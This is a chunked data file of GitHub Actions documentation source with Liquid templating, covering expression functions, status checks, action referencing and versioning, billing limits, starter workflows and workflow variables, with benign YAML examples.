%}\n\nReturns 'Hello Mona the Octocat'.\n\n\n\nExample escaping braces\n\n{% raw %}\n\n```javascript\nformat('{{Hello {0} {1} {2}!}}', 'Mona', 'the', 'Octocat')\n```\n\n{% endraw %}\n\nReturns '{Hello Mona the Octocat!}'.\n\n\n\njoin\n\n`join( array, optionalSeparator )`\n\nThe value for `array` can be an array or a string. All values in `array` are concatenated into a string. If you provide `optionalSeparator`, it is inserted between the concatenated values. Otherwise, the default separator `,` is used. Casts values to a string.\n\n\n\nExample of `join`\n\n`join(github.event.issue.labels.*.name, ', ')` may return 'bug, help wanted'\n\n\n\ntoJSON\n\n`toJSON(value)`\n\nReturns a pretty-print JSON representation of `value`. You can use this function to debug the information provided in contexts.\n\n\n\nExample of `toJSON`\n\n`toJSON(job)` might return `{ \"status\": \"success\" }`\n\n\n\nfromJSON\n\n`fromJSON(value)`\n\nReturns a JSON object or JSON data type for `value`. You can us", "Y2h1bmtfNF9pbmRleF8xMzI=": "e this function to provide a JSON object as an evaluated expression or to convert environment variables from a string.\n\n\n\nExample returning a JSON object\n\nThis workflow sets a JSON matrix in one job, and passes it to the next job using an output and `fromJSON`.\n\n{% raw %}\n\n```yaml\nname: build\non: push\njobs:\n  job1:\n    runs-on: ubuntu-latest\n    outputs:\n      matrix: ${{ steps.set-matrix.outputs.matrix }}\n    steps:\n      - id: set-matrix{% endraw %}\n{%- ifversion actions-save-state-set-output-envs %}\n        run: echo \"matrix={\\\"include\\\":[{\\\"project\\\":\\\"foo\\\",\\\"config\\\":\\\"Debug\\\"},{\\\"project\\\":\\\"bar\\\",\\\"config\\\":\\\"Release\\\"}]}\" >> $GITHUB_OUTPUT\n{%- else %}\n        run: echo \"::set-output name=matrix::{\\\"include\\\":[{\\\"project\\\":\\\"foo\\\",\\\"config\\\":\\\"Debug\\\"},{\\\"project\\\":\\\"bar\\\",\\\"config\\\":\\\"Release\\\"}]}\"\n{%- endif %}{% raw %}\n  job2:\n    needs: job1\n    runs-on: ubuntu-latest\n    strategy:\n      matrix: ${{ fromJSON(needs.job1.outputs.matrix) }}\n    steps:\n      - run: build\n```\n\n{% endraw %}\n\n\n\nExample returning a JSON data type\n\nThis workflow uses `fromJSON` to convert environment variables from a string to a Boolean or integer.\n\n{% raw %}\n\n```yaml\nname: print\non: push\nenv:\n  continue: true\n  time: 3\njobs:\n  job1:\n    runs-on: ubuntu-latest\n    steps:\n      - continue-on-error: ${{ fromJSON(env.continue) }}\n        timeout-minutes: ${{ fromJSON(env.time) }}\n        run: echo ...\n```\n\n{% endraw %}\n\n\n\nhashFiles\n\n`hashFiles(path)`\n\nReturns a single hash for the set of files that matches the `path` pattern. You can provide a single `path` pattern or multiple `path` patterns separated by commas. The `path` is relative to the `GITHUB_WORKSPACE` directory and can only include files inside of the `GITHUB_WORKSPACE`. This function calculates an individual SHA-256 hash for each matched file, and then uses those hashes to calculate a final SHA-256 hash for the set of files. If the `path` pattern does not match any files, this returns an empty string. For more information about SHA-256, see \"SHA-2.\"\n\nYou can use pattern", "Y2h1bmtfNV9pbmRleF8xMzI=": " matching characters to match file names. Pattern matching for `hashFiles` follows glob pattern matching and is case-insensitive on Windows. For more information about supported pattern matching characters, see the Patterns section in the `@actions/glob` documentation.\n\n\n\nExample with a single pattern\n\nMatches any `package-lock.json` file in the repository.\n\n`hashFiles('**/package-lock.json')`\n\n\n\nExample with multiple patterns\n\nCreates a hash for any `package-lock.json` and `Gemfile.lock` files in the repository.\n\n`hashFiles('**/package-lock.json', '**/Gemfile.lock')`\n\n\n\nStatus check functions\n\nYou can use the following status check functions as expressions in `if` conditionals. A default status check of `success()` is applied unless you include one of these functions. For more information about `if` conditionals, see \"AUTOTITLE\" and \"AUTOTITLE\".\n\n\n\nsuccess\n\nReturns `true` when all previous steps have succeeded.\n\n\n\nExample of `success`\n\n```yaml\nsteps:\n  ...\n  - name: The job has succeeded\n    if: {% raw %}${{ success() }}{% endraw %}\n```\n\n\n\nalways\n\nCauses the step to always execute, and returns `true`, even when canceled. The `always` expression is best used at the step level or on tasks that you expect to run even when a job is canceled. For example, you can use `always` to send logs even when a job is canceled.\n\n{% warning %}\n\n**Warning:** Avoid using `always` for any task that could suffer from a critical failure, for example: getting sources, otherwise the workflow may hang until it times out. If you want to run a job or step regardless of its success or failure, use the recommended alternative: `if: {% raw %}${{ !cancelled() }}{% endraw %}`\n\n{% endwarning %}\n\n\n\nExample of `always`\n\n```yaml\nif: {% raw %}${{ always() }}{% endraw %}\n```\n\n\n\ncancelled\n\nReturns `true` if the workflow was canceled.\n\n\n\nExample of `cancelled`\n\n```yaml\nif: {% raw %}${{ cancelled() }}{% endraw %}\n```\n\n\n\nfailure\n\nReturns `true` when any previous step of a job fails. If you have a chain of dependent jobs, `failure()` returns `true` if an", "Y2h1bmtfNl9pbmRleF8xMzI=": "y ancestor job fails.\n\n\n\nExample of `failure`\n\n```yaml\nsteps:\n  ...\n  - name: The job has failed\n    if: {% raw %}${{ failure() }}{% endraw %}\n```\n\n\n\nfailure with conditions\n\nYou can include extra conditions for a step to run after a failure, but you must still include `failure()` to override the default status check of `success()` that is automatically applied to `if` conditions that don't contain a status check function.\n\n\n\nExample of `failure` with conditions\n\n```yaml\nsteps:\n  ...\n  - name: Failing step\n    id: demo\n    run: exit 1\n  - name: The demo step has failed\n    if: {% raw %}${{ failure() && steps.demo.conclusion == 'failure' }}{% endraw %}\n```\n\n\n\nObject filters\n\nYou can use the `*` syntax to apply a filter and select matching items in a collection.\n\nFor example, consider an array of objects named `fruits`.\n\n```json\n[\n  { \"name\": \"apple\", \"quantity\": 1 },\n  { \"name\": \"orange\", \"quantity\": 2 },\n  { \"name\": \"pear\", \"quantity\": 1 }\n]\n```\n\nThe filter `fruits.*.name` returns the array `[ \"apple\", \"orange\", \"pear\" ]`.\n\nYou may also use the `*` syntax on an object. For example, suppose you have an object named `vegetables`.\n\n```json\n\n{\n  \"scallions\":\n  {\n    \"colors\": [\"green\", \"white\", \"red\"],\n    \"ediblePortions\": [\"roots\", \"stalks\"],\n  },\n  \"beets\":\n  {\n    \"colors\": [\"purple\", \"red\", \"gold\", \"white\", \"pink\"],\n    \"ediblePortions\": [\"roots\", \"stems\", \"leaves\"],\n  },\n  \"artichokes\":\n  {\n    \"colors\": [\"green\", \"purple\", \"red\", \"black\"],\n    \"ediblePortions\": [\"hearts\", \"stems\", \"leaves\"],\n  },\n}\n```\n\nThe filter `vegetables.*.ediblePortions` could evaluate to:\n\n```json\n\n[\n  [\"roots\", \"stalks\"],\n  [\"hearts\", \"stems\", \"leaves\"],\n  [\"roots\", \"stems\", \"leaves\"],\n]\n```\n\nSince objects don't preserve order, the order of the output cannot be guaranteed.\n\n", "Y2h1bmtfMF9pbmRleF8xMzM=": "\n\nOverview\n\nThe actions you use in your workflow can be defined in:\n\n- The same repository as your workflow file{% ifversion internal-actions %}\n- An internal repository within the same enterprise account that is configured to allow access to workflows{% endif %}\n- Any public repository\n- A published Docker container image on Docker Hub\n\n{% data variables.product.prodname_marketplace %} is a central location for you to find actions created by the {% data variables.product.prodname_dotcom %} community.{% ifversion fpt or ghec %} {% data variables.product.prodname_marketplace %} page enables you to filter for actions by category. {% endif %}\n\n{% data reusables.actions.enterprise-marketplace-actions %}\n\n{% ifversion fpt or ghec %}\n\n\n\nBrowsing Marketplace actions in the workflow editor\n\nYou can search and browse actions directly in your repository's workflow editor. From the sidebar, you can search for a specific action, view featured actions, and browse featured categories. You can also view the number of stars an action has received from the {% data variables.product.prodname_dotcom %} community.\n\n1. In your repository, browse to the workflow file you want to edit.\n1. In the upper right corner of the file view, to open the workflow editor, click {% octicon \"pencil\" aria-label=\"Edit file\" %}.\n   !Screenshot of a workflow file showing the header section. The pencil icon for editing files is highlighted with a dark orange outline.\n1. To the right of the editor, use the {% data variables.product.prodname_marketplace %} sidebar to browse actions. Actions with the {% octicon \"verified\" aria-label=\"Creator verified by GitHub\" %} badge indicate {% data variables.product.prodname_dotcom %} has verified the creator of the action as a partner organization.\n   !Screenshot of a workflow file in edit mode. The right sidebar shows Marketplace actions. A checkmark in a stamp icon, showing that the creator is verified by GitHub, is outlined in orange.\n\n\n\nAdding an action to your workflow\n\nYou can add an action to your workflow by r", "Y2h1bmtfMV9pbmRleF8xMzM=": "eferencing the action in your workflow file.\n\nYou can view the actions referenced in your {% data variables.product.prodname_actions %} workflows as dependencies in the dependency graph of the repository containing your workflows. For more information, see \u201cAbout the dependency graph.\u201d\n\n{% data reusables.actions.actions-redirects-workflows %}\n\n\n\nAdding an action from {% data variables.product.prodname_marketplace %}\n\nAn action's listing page includes the action's version and the workflow syntax required to use the action. To keep your workflow stable even when updates are made to an action, you can reference the version of the action to use by specifying the Git or Docker tag number in your workflow file.\n\n1. Navigate to the action you want to use in your workflow.\n1. Click to view the full marketplace listing for the action.\n1. Under \"Installation\", click {% octicon \"copy\" aria-label=\"Copy to clipboard\" %} to copy the workflow syntax.\n   !Screenshot of the marketplace listing for an action. The \"Copy to clipboard\" icon for the action is highlighted with a dark orange outline.\n1. Paste the syntax as a new step in your workflow. For more information, see \"AUTOTITLE.\"\n1. If the action requires you to provide inputs, set them in your workflow. For information on inputs an action might require, see \"AUTOTITLE.\"\n\n{% data reusables.dependabot.version-updates-for-actions %}\n\n{% endif %}\n\n\n\nAdding an action from the same repository\n\nIf an action is defined in the same repository where your workflow file uses the action, you can reference the action with either the \u200c`{owner}/{repo}@{ref}` or `./path/to/dir` syntax in your workflow file.\n\n{% data reusables.actions.workflows.section-referencing-an-action-from-the-same-repository %}\n\nThe `action.yml` file is used to provide metadata for the action. Learn about the content of this file in \"AUTOTITLE.\"\n\n\n\nAdding an action from a different repository\n\nIf an action is defined in a different repository than your workflow file, you can reference the action with the `{owner}/{repo}", "Y2h1bmtfMl9pbmRleF8xMzM=": "@{ref}` syntax in your workflow file.\n\nThe action must be stored in a public repository{% ifversion internal-actions %} or an internal repository that is configured to allow access to workflows. For more information, see \"AUTOTITLE.\"{% else %}.{% endif %}\n\n```yaml\njobs:\n  my_first_job:\n    steps:\n      - name: My first step\n        uses: {% data reusables.actions.action-setup-node %}\n```\n\n\n\nReferencing a container on Docker Hub\n\nIf an action is defined in a published Docker container image on Docker Hub, you must reference the action with the `docker://{image}:{tag}` syntax in your workflow file. To protect your code and data, we strongly recommend you verify the integrity of the Docker container image from Docker Hub before using it in your workflow.\n\n```yaml\njobs:\n  my_first_job:\n    steps:\n      - name: My first step\n        uses: docker://alpine:3.8\n```\n\nFor some examples of Docker actions, see the Docker-image.yml workflow and \"AUTOTITLE.\"\n\n\n\nUsing release management for your custom actions\n\nThe creators of a community action have the option to use tags, branches, or SHA values to manage releases of the action. Similar to any dependency, you should indicate the version of the action you'd like to use based on your comfort with automatically accepting updates to the action.\n\nYou will designate the version of the action in your workflow file. Check the action's documentation for information on their approach to release management, and to see which tag, branch, or SHA value to use.\n\n{% note %}\n\n**Note:** We recommend that you use a SHA value when using third-party actions. However, it's important to note {% data variables.product.prodname_dependabot %} will only create {% data variables.product.prodname_dependabot_alerts %} for vulnerable {% data variables.product.prodname_actions %} that use semantic versioning. For more information, see \"AUTOTITLE\" and \"AUTOTITLE.\"\n\n{% endnote %}\n\n\n\nUsing tags\n\nTags are useful for letting you decide when to switch between major and minor versions, but these are more ephemeral", "Y2h1bmtfM19pbmRleF8xMzM=": " and can be moved or deleted by the maintainer. This example demonstrates how to target an action that's been tagged as `v1.0.1`:\n\n```yaml\nsteps:\n  - uses: actions/javascript-action@v1.0.1\n```\n\n\n\nUsing SHAs\n\nIf you need more reliable versioning, you should use the SHA value associated with the version of the action. SHAs are immutable and therefore more reliable than tags or branches. However, this approach means you will not automatically receive updates for an action, including important bug fixes and security updates. You must use a commit's full SHA value, and not an abbreviated value. {% data reusables.actions.actions-pin-commit-sha %} This example targets an action's SHA:\n\n```yaml\nsteps:\n  - uses: actions/javascript-action@a824008085750b8e136effc585c3cd6082bd575f\n```\n\n\n\nUsing branches\n\nSpecifying a target branch for the action means it will always run the version currently on that branch. This approach can create problems if an update to the branch includes breaking changes. This example targets a branch named `@main`:\n\n```yaml\nsteps:\n  - uses: actions/javascript-action@main\n```\n\nFor more information, see \"AUTOTITLE.\"\n\n\n\nUsing inputs and outputs with an action\n\nAn action often accepts or requires inputs and generates outputs that you can use. For example, an action might require you to specify a path to a file, the name of a label, or other data it will use as part of the action processing.\n\nTo see the inputs and outputs of an action, check the `action.yml` or `action.yaml` in the root directory of the repository.\n\nIn this example `action.yml`, the `inputs` keyword defines a required input called `file-path`, and includes a default value that will be used if none is specified. The `outputs` keyword defines an output called `results-file`, which tells you where to locate the results.\n\n```yaml\nname: \"Example\"\ndescription: \"Receives file and generates output\"\ninputs:\n  file-path: # id of input\n    description: \"Path to test script\"\n    required: true\n    default: \"test-file.js\"\noutputs:\n  results-file: # id of", "Y2h1bmtfNF9pbmRleF8xMzM=": " output\n    description: \"Path to results file\"\n```\n\n{% ifversion ghae %}\n\n\n\nUsing the actions included with {% data variables.product.prodname_ghe_managed %}\n\nBy default, you can use most of the official {% data variables.product.prodname_dotcom %}-authored actions in {% data variables.product.prodname_ghe_managed %}. For more information, see \"AUTOTITLE.\"\n{% endif %}\n\n\n\nNext steps\n\nTo continue learning about {% data variables.product.prodname_actions %}, see \"AUTOTITLE.\"\n\n", "Y2h1bmtfMF9pbmRleF8xMzQ=": "\n\nOverview\n\n{% data reusables.actions.about-actions %}  You can create workflows that build and test every pull request to your repository, or deploy merged pull requests to production.\n\n{% data variables.product.prodname_actions %} goes beyond just DevOps and lets you run workflows when other events happen in your repository. For example, you can run a workflow to automatically add the appropriate labels whenever someone creates a new issue in your repository.\n\n{% ifversion fpt or ghec %}\n\n{% data variables.product.prodname_dotcom %} provides Linux, Windows, and macOS virtual machines to run your workflows, or you can host your own self-hosted runners in your own data center or cloud infrastructure.\n\n{% elsif ghes or ghae %}\n\nYou must host your own Linux, Windows, or macOS virtual machines to run workflows for {% data variables.location.product_location %}. {% data reusables.actions.self-hosted-runner-locations %}\n\n{% endif %}\n\n{% ifversion ghec or ghes or ghae %}\n\nFor more information about introducing {% data variables.product.prodname_actions %} to your enterprise, see \"AUTOTITLE.\"\n\n{% endif %}\n\n\n\nThe components of {% data variables.product.prodname_actions %}\n\nYou can configure a {% data variables.product.prodname_actions %} _workflow_ to be triggered when an _event_ occurs in your repository, such as a pull request being opened or an issue being created.  Your workflow contains one or more _jobs_ which can run in sequential order or in parallel.  Each job will run inside its own virtual machine _runner_, or inside a container, and has one or more _steps_ that either run a script that you define or run an _action_, which is a reusable extension that can simplify your workflow.\n\n!Diagram of an event triggering Runner 1 to run Job 1, which triggers Runner 2 to run Job 2. Each of the jobs is broken into multiple steps.\n\n\n\nWorkflows\n\n{% data reusables.actions.about-workflows-long %}\n\nYou can reference a workflow within another workflow. For more information, see \"AUTOTITLE.\"\n\nFor more information about workflows", "Y2h1bmtfMV9pbmRleF8xMzQ=": ", see \"AUTOTITLE.\"\n\n\n\nEvents\n\nAn event is a specific activity in a repository that triggers a workflow run. For example, activity can originate from {% data variables.product.prodname_dotcom %} when someone creates a pull request, opens an issue, or pushes a commit to a repository.  You can also trigger a workflow to run on a schedule, by posting to a REST API, or manually.\n\nFor a complete list of events that can be used to trigger workflows, see Events that trigger workflows.\n\n\n\nJobs\n\nA job is a set of _steps_ in a workflow that is executed on the same runner.  Each step is either a shell script that will be executed, or an _action_ that will be run.  Steps are executed in order and are dependent on each other.  Since each step is executed on the same runner, you can share data from one step to another.  For example, you can have a step that builds your application followed by a step that tests the application that was built.\n\nYou can configure a job's dependencies with other jobs; by default, jobs have no dependencies and run in parallel with each other.  When a job takes a dependency on another job, it will wait for the dependent job to complete before it can run.  For example, you may have multiple build jobs for different architectures that have no dependencies, and a packaging job that is dependent on those jobs.  The build jobs will run in parallel, and when they have all completed successfully, the packaging job will run.\n\nFor more information about jobs, see \"AUTOTITLE.\"\n\n\n\nActions\n\nAn _action_ is a custom application for the {% data variables.product.prodname_actions %} platform that performs a complex but frequently repeated task.  Use an action to help reduce the amount of repetitive code that you write in your workflow files.  An action can pull your git repository from {% data variables.product.prodname_dotcom %}, set up the correct toolchain for your build environment, or set up the authentication to your cloud provider.\n\nYou can write your own actions, or you can find actions to use in your workfl", "Y2h1bmtfMl9pbmRleF8xMzQ=": "ows in the {% data variables.product.prodname_marketplace %}.\n\n{% data reusables.actions.internal-actions-summary %}\n\nFor more information, see \"AUTOTITLE.\"\n\n\n\nRunners\n\n{% data reusables.actions.about-runners %} Each runner can run a single job at a time. {% ifversion ghes or ghae %} You must host your own runners for {% data variables.product.product_name %}. {% elsif fpt or ghec %}{% data variables.product.company_short %} provides Ubuntu Linux, Microsoft Windows, and macOS runners to run your workflows; each workflow run executes in a fresh, newly-provisioned virtual machine. {% ifversion actions-hosted-runners %} {% data variables.product.prodname_dotcom %} also offers {% data variables.actions.hosted_runner %}s, which are available in larger configurations. For more information, see \"AUTOTITLE.\" {% endif %}If you need a different operating system or require a specific hardware configuration, you can host your own runners.{% endif %} For more information{% ifversion fpt or ghec %} about self-hosted runners{% endif %}, see \"AUTOTITLE.\"\n\n{% data reusables.actions.workflow-basic-example-and-explanation %}\n\n\n\nNext steps\n\n{% data reusables.actions.onboarding-next-steps %}\n\n{% ifversion ghec or ghes or ghae %}\n\n\n\nFurther reading\n\n- \"AUTOTITLE\"\n{% endif %}\n\n", "Y2h1bmtfMF9pbmRleF8xMzU=": "\n\nAbout billing for {% data variables.product.prodname_actions %}\n\n{% data reusables.repositories.about-github-actions %} For more information, see \"AUTOTITLE{% ifversion fpt %}.\"{% elsif ghes or ghec %}\" and \"AUTOTITLE.\"{% endif %}\n\n{% ifversion fpt or ghec %}\n{% data reusables.actions.actions-billing %} For more information, see \"AUTOTITLE.\"\n{% else %}\nGitHub Actions usage is free for {% data variables.product.prodname_ghe_server %} instances that use self-hosted runners. For more information, see \"AUTOTITLE.\"\n{% endif %}\n\n{% ifversion fpt or ghec %}\n\n\n\nAvailability\n\n{% data variables.product.prodname_actions %} is available on all {% data variables.product.prodname_dotcom %} products, but {% data variables.product.prodname_actions %} is not available for private repositories owned by accounts using legacy per-repository plans. {% data reusables.gated-features.more-info %}\n\n{% endif %}\n\n\n\nUsage limits\n\n{% ifversion fpt or ghec %}\nThere are some limits on {% data variables.product.prodname_actions %} usage when using {% data variables.product.prodname_dotcom %}-hosted runners. These limits are subject to change.\n\n{% note %}\n\n**Note:** For self-hosted runners, different usage limits apply. For more information, see \"AUTOTITLE.\"\n\n{% endnote %}\n\n- **Job execution time** - Each job in a workflow can run for up to 6 hours of execution time. If a job reaches this limit, the job is terminated and fails to complete.\n{% data reusables.actions.usage-workflow-run-time %}\n{% data reusables.actions.usage-api-requests %}\n- **Concurrent jobs** - The number of concurrent jobs you can run in your account depends on your {% data variables.product.prodname_dotcom %} plan, as well as the type of runner used. If exceeded, any additional jobs are queued.\n\n  **Standard {% data variables.product.prodname_dotcom %}-hosted runners**\n\n  | GitHub plan | Total concurrent jobs | Maximum concurrent macOS jobs |\n  |---|---|---|\n  | Free | 20 | 5 |\n  | Pro | 40 | 5 |\n  | Team | 60 | 5 |\n  | Enterprise | 1000 | 50 |\n\n  **{% data variables.produc", "Y2h1bmtfMV9pbmRleF8xMzU=": "t.prodname_dotcom %}-hosted {% data variables.actions.hosted_runner %}s**\n\n  | GitHub plan | Total concurrent jobs | Maximum concurrent macOS jobs |\n  |---|---|---|\n  | All | 500 | The limit is based on your {% data variables.product.prodname_dotcom %} plan. |\n\n  {% note %}\n\n  **Note:** If required, customers on enterprise plans can request a higher limit for concurrent jobs. For more information, contact us through the {% data variables.contact.contact_support_portal %}, or contact your sales representative.\n\n  {% endnote %}\n\n- **Job matrix** - {% data reusables.actions.usage-matrix-limits %}\n{% data reusables.actions.usage-workflow-queue-limits %}\n\n{% else %}\nUsage limits apply to self-hosted runners. For more information, see \"AUTOTITLE.\"\n{% endif %}\n\n{% ifversion fpt or ghec %}\n\n\n\nUsage policy\n\nIn addition to the usage limits, you must ensure that you use {% data variables.product.prodname_actions %} within the GitHub Terms of Service. For more information on {% data variables.product.prodname_actions %}-specific terms, see the GitHub Additional Product Terms.\n{% endif %}\n\n{% ifversion fpt or ghes or ghec %}\n\n\n\nBilling for reusable workflows\n\nIf you reuse a workflow, billing is always associated with the caller workflow. Assignment of {% data variables.product.prodname_dotcom %}-hosted runners is always evaluated using only the caller's context. The caller cannot use {% data variables.product.prodname_dotcom %}-hosted runners from the called repository.\n\nFor more information see, \"AUTOTITLE.\"\n{% endif %}\n\n\n\nArtifact and log retention policy\n\nYou can configure the artifact and log retention period for your repository, organization, or enterprise account.\n\n{% data reusables.actions.about-artifact-log-retention %}\n\nFor more information, see:\n\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n\n\n\nDisabling or limiting {% data variables.product.prodname_actions %} for your repository or organization\n\n{% data reusables.actions.disabling-github-actions %}\n\n{% ifversion actions-cache-admin-ui %}You can also manage {% data var", "Y2h1bmtfMl9pbmRleF8xMzU=": "iables.product.prodname_actions %} settings for your enterprise, such as workflow permissions and cache storage.{% endif %}\n\nFor more information, see:\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n\n\n\nDisabling and enabling workflows\n\nYou can enable and disable individual workflows in your repository on {% data variables.product.prodname_dotcom %}.\n\n{% data reusables.actions.scheduled-workflows-disabled %}\n\nFor more information, see \"AUTOTITLE.\"\n\n", "Y2h1bmtfMF9pbmRleF8xMzY=": "\n\nAbout starter workflows\n\nStarter workflows are templates that help you to create your own {% data variables.product.prodname_actions %} workflows for a repository. They offer an alternative to starting from a blank workflow file and are useful because some of the work will already have been done for you.\n\n{% data variables.product.product_name %} offers starter workflows for a variety of languages and tooling. When you set up workflows in your repository, {% data variables.product.product_name %} analyzes the code in your repository and recommends workflows based on the language and framework in your repository. For example, if you use Node.js, {% data variables.product.product_name %} will suggest a starter workflow file that installs your Node.js packages and runs your tests.{% ifversion actions-starter-template-ui %} You can search and filter to find relevant starter workflows.{% endif %}\n\n{% data reusables.actions.starter-workflow-categories %}\n\nYou can also create your own starter workflow to share with your organization. These starter workflows will appear alongside the {% data variables.product.product_name %}-provided starter workflows. Anyone with write access to the organization's `github` repository can set up a starter workflow. For more information, see \"AUTOTITLE.\"\n\n\n\nChoosing and using a starter workflow\n\n{% data reusables.repositories.navigate-to-repo %}\n{% data reusables.repositories.actions-tab %}\n{% data reusables.actions.new-starter-workflow %}\n1. The \"{% ifversion actions-starter-template-ui %}Choose a workflow{% else %}Choose a workflow template{% endif %}\" page shows a selection of recommended starter workflows. Find the starter workflow that you want to use, then click {% ifversion actions-starter-template-ui %}**Configure**{% else %}**Set up this workflow**{% endif %}.{% ifversion actions-starter-template-ui %} To help you find the starter workflow that you want, you can search for keywords or filter by category.{% endif %}\n1. If the starter workflow contains comments detailing addition", "Y2h1bmtfMV9pbmRleF8xMzY=": "al setup steps, follow these steps.\n\n   There are guides to accompany many of the starter workflows for building and testing projects. For more information, see \"AUTOTITLE.\"\n\n1. Some starter workflows use secrets. For example, {% raw %}`${{ secrets.npm_token }}`{% endraw %}. If the starter workflow uses a secret, store the value described in the secret name as a secret in your repository. For more information, see \"AUTOTITLE.\"\n1. Optionally, make additional changes. For example, you might want to change the value of `on` to change when the workflow runs.\n1. Click **Start commit**.\n1. Write a commit message and decide whether to commit directly to the default branch or to open a pull request.\n\n\n\nFurther reading\n\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n{% ifversion fpt or ghec %}\n- \"AUTOTITLE\"\n{% endif %}\n\n", "Y2h1bmtfMF9pbmRleF8xMzc=": "\n\nAbout variables\n\n{% ifversion actions-configuration-variables %}\n\nVariables provide a way to store and reuse non-sensitive configuration information. You can store any configuration data such as compiler flags, usernames, or server names as variables. Variables are interpolated on the runner machine that runs your workflow. Commands that run in actions or workflow steps can create, read, and modify variables.\n\nYou can set your own custom variables or use the default environment variables that {% data variables.product.prodname_dotcom %} sets automatically. For more information, see \"Default environment variables\".\n\nYou can set a custom variable in two ways.\n\n- To define an environment variable for use in a single workflow, you can use the `env` key in the workflow file.  For more information, see \"Defining environment variables for a single workflow\".\n- To define a configuration variable across multiple workflows, you can define it at the organization, repository, or environment level. For more information, see \"Defining configuration variables for multiple workflows\".\n\n{% warning %}\n\n**Warning:** By default, variables render unmasked in your build outputs. If you need greater security for sensitive information, such as passwords, use secrets instead. For more information, see \"AUTOTITLE\".\n\n{% endwarning %}\n\n{% else %}\n\nYou can use variables to store information that you want to reference in your workflow. You reference variables within a workflow step or an action, and the variables are interpolated on the runner machine that runs your workflow. Commands that run in actions or workflow steps can create, read, and modify variables.\n\nYou can set your own custom variables, you can use the default variables that {% data variables.product.prodname_dotcom %} sets automatically, and you can also use any other variables that are set in the working environment on the runner. Variables are case-sensitive.\n\n{% endif %}\n\n\n\nDefining environment variables{% ifversion actions-configuration-variables %} for a single workflow{", "Y2h1bmtfMV9pbmRleF8xMzc=": "% endif %}\n\nTo set a custom environment variable{% ifversion actions-configuration-variables %} for a single workflow{% endif %}, you can define it using the `env` key in the workflow file. The scope of a custom variable set by this method is limited to the element in which it is defined. You can define variables that are scoped for:\n\n- The entire workflow, by using `env` at the top level of the workflow file.\n- The contents of a job within a workflow, by using `jobs..env`.\n- A specific step within a job, by using `jobs..steps[*].env`.\n\n{% raw %}\n\n```yaml copy\nname: Greeting on variable day\n\non:\n  workflow_dispatch\n\nenv:\n  DAY_OF_WEEK: Monday\n\njobs:\n  greeting_job:\n    runs-on: ubuntu-latest\n    env:\n      Greeting: Hello\n    steps:\n      - name: \"Say Hello Mona it's Monday\"\n        run: echo \"$Greeting $First_Name. Today is $DAY_OF_WEEK!\"\n        env:\n          First_Name: Mona\n```\n\n{% endraw %}\n\nYou can access `env` variable values using runner environment variables or using contexts. The example above shows three custom variables being used as runner environment variables in an `echo` command: `$DAY_OF_WEEK`, `$Greeting`, and `$First_Name`. The values for these variables are set, and scoped, at the workflow, job, and step level respectively. The interpolation of these variables happens on the runner.\n\nThe commands in the `run` steps of a workflow, or a referenced action, are processed by the shell you are using on the runner. The instructions in the other parts of a workflow are processed by {% data variables.product.prodname_actions %} and are not sent to the runner. You can use either runner environment variables or contexts in `run` steps, but in the parts of a workflow that are not sent to the runner you must use contexts to access variable values. For more information, see \"Using contexts to access variable values.\"\n\nBecause runner environment variable interpolation is done after a workflow job is sent to a runner machine, you must use the appropriate syntax for the shell that's used on the runner. In thi", "Y2h1bmtfMl9pbmRleF8xMzc=": "s example, the workflow specifies `ubuntu-latest`. By default, Linux runners use the bash shell, so you must use the syntax `$NAME`. By default, Windows runners use PowerShell, so you would use the syntax `$env:NAME`. For more information about shells, see \"AUTOTITLE.\"\n\n\n\nNaming conventions for environment variables\n\nWhen you set an environment variable, you cannot use any of the default environment variable names. For a complete list of default environment variables, see \"Default environment variables\" below. If you attempt to override the value of one of these default variables, the assignment is ignored.\n\nAny new variables you set that point to a location on the filesystem should have a `_PATH` suffix. The `GITHUB_ENV` and `GITHUB_WORKSPACE` default variables are exceptions to this convention.\n\n{% note %}\n\n**Note**: You can list the entire set of environment variables that are available to a workflow step by using `run: env` in a step and then examining the output for the step.\n\n{% endnote %}\n\n{% ifversion actions-configuration-variables %}\n\n\n\nDefining configuration variables for multiple workflows\n\n{% data reusables.actions.configuration-variables-beta-note %}\n\nYou can create configuration variables for use across multiple workflows, and can define them at either the organization, repository, or environment level.\n\nFor example, you can use configuration variables to set default values for parameters passed to build tools at an organization level, but then allow repository owners to override these parameters on a case-by-case basis.\n\nWhen you define configuration variables, they are automatically available in the `vars` context. For more information, see \"Using the `vars` context to access configuration variable values\".\n\n\n\nConfiguration variable precedence\n\nIf a variable with the same name exists at multiple levels, the variable at the lowest level takes precedence. For example, if an organization-level variable has the same name as a repository-level variable, then the repository-level variable takes precede", "Y2h1bmtfM19pbmRleF8xMzc=": "nce. Similarly, if an organization, repository, and environment all have a variable with the same name, the environment-level variable takes precedence.\n\nFor reusable workflows, the variables from the caller workflow's repository are used. Variables from the repository that contains the called workflow are not made available to the caller workflow.\n\n\n\nNaming conventions for configuration variables\n\nThe following rules apply to configuration variable names:\n\n{% data reusables.actions.actions-secrets-and-variables-naming %}\n\n\n\nCreating configuration variables for a repository\n\n{% data reusables.actions.permissions-statement-secrets-variables-repository %}\n\n{% data reusables.repositories.navigate-to-repo %}\n{% data reusables.repositories.sidebar-settings %}\n{% data reusables.actions.sidebar-secrets-and-variables %}\n{% data reusables.actions.actions-variables-tab %}\n   !Screenshot of the \"Actions secrets and variables\" page. The \"Variables\" tab is highlighted with a dark orange outline.\n1. Click **New repository variable**.\n{% data reusables.actions.variable-fields %}\n1. Click **Add variable**.\n\n\n\nCreating configuration variables for an environment\n\n{% data reusables.actions.permissions-statement-secrets-environment %}\n\n{% data reusables.repositories.navigate-to-repo %}\n{% data reusables.repositories.sidebar-settings %}\n{% data reusables.actions.sidebar-environment %}\n1. Click on the environment that you want to add a variable to.\n1. Under **Environment variables**, click **Add variable**.\n{% data reusables.actions.variable-fields %}\n1. Click **Add variable**.\n\n\n\nCreating configuration variables for an organization\n\n{% data reusables.actions.actions-secrets-variables-repository-access %}\n\n{% data reusables.actions.permissions-statement-secrets-and-variables-organization %}\n\n{% data reusables.organizations.navigate-to-org %}\n{% data reusables.organizations.org_settings %}\n{% data reusables.actions.sidebar-secrets-and-variables %}\n{% data reusables.actions.actions-variables-tab %}\n\n   !Screenshot of the \"Actions secret", "Y2h1bmtfNF9pbmRleF8xMzc=": "s and variables\" page. A tab, labeled \"Variables,\" is outlined in dark orange.\n1. Click **New organization 